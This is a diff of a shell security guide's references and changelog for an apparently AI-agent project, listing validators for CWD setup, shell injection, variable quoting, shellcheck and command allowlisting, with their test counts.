-- **Spawn Template**: `.claude/templates/spawn/bash-safe-background.md`
-- **Hook Catalog**: `.claude/hooks/safety/README.md`
+- **ADR-077:** `.claude/context/memory/decisions.md` (Shell Command Security Architecture)
+- **Audit Report:** `.claude/context/artifacts/audits/BACKGROUND-TASK-SHELL-AUDIT.md`
+- **Issues:**
+  - SHELL-SECURITY-001: Background Bash tasks missing CWD initialization
+  - SHELL-SECURITY-002: No shell injection validation
+  - SHELL-SECURITY-003: Unquoted variables in Bash commands
+  - SHELL-SECURITY-004: No shellcheck integration
 
 ---
 
 ## Changelog
 
-### 2026-01-31: Phase 3 Complete
+### Phase 2 (2026-01-31) - COMPLETE
 
-- ✅ Shellcheck validator implemented (`.claude/hooks/safety/shellcheck-validator.cjs`)
-- ✅ Command allowlist library implemented (`.claude/lib/safety/command-allowlist.cjs`)
-- ✅ Command allowlist validator implemented (`.claude/hooks/safety/command-allowlist-validator.cjs`)
-- ✅ Command allowlist configuration created (`.claude/config/command-allowlist.yaml`)
-- ✅ Shellcheck validator tests (20 tests)
-- ✅ Command allowlist validator tests (40 tests)
-- ✅ Phase 3 integration tests (25 tests)
-- ✅ SHELL-SECURITY-GUIDE.md documentation
+- ✅ Created `variable-quoting-validator.cjs` (17 tests passing)
+- ✅ Exported `PROJECT_ROOT` to environment (.env.example + .env)
+- ✅ Created integration tests (13 tests passing)
+- ✅ Updated documentation (this guide)
 
-### 2026-01-31: Phase 1 Complete
+### Phase 1 (2026-01-31) - COMPLETE
 
-- ✅ Bash CWD validator implemented
-- ✅ Shell injection validator implemented
-- ✅ Spawn template updates (universal-agent-spawn.md)
-- ✅ Bash safe background template created
+- ✅ Created `bash-cwd-validator.cjs` (17 tests passing)
+- ✅ Created `shell-injection-validator.cjs` (25 tests passing)
+- ✅ Updated spawn templates (universal-agent-spawn.md, orchestrator-spawn.md)
 
-### Proposed: Phase 2
+### Phase 3 (2026-01-31) - COMPLETE
 
-- ⏳ Variable quoting validator (planned)
-- ⏳ PROJECT_ROOT environment export (planned)
+- ✅ Shellcheck integration
+- ✅ Command allowlist validator
+- ✅ Phase 3 integration tests
 
 ---
 
-## Conclusion
-
-The three-phase shell security architecture provides defense-in-depth protection against shell injection, path traversal, and data exfiltration vulnerabilities. By combining CWD initialization (Phase 1), injection protection (Phase 1), shellcheck validation (Phase 3), and command allowlisting (Phase 3), the system achieves 53% risk reduction while maintaining usability through configurable enforcement modes.
-
-**Next Steps:**
-1. Monitor validation logs for false positives
-2. Tune allowlist based on usage patterns
-3. Implement Phase 2 (variable quoting + environment export)
-4. Add audit logging for security events
+**Last Updated:** 2026-01-31
+**Maintained By:** Security Team
+**Version:** 1.0.0
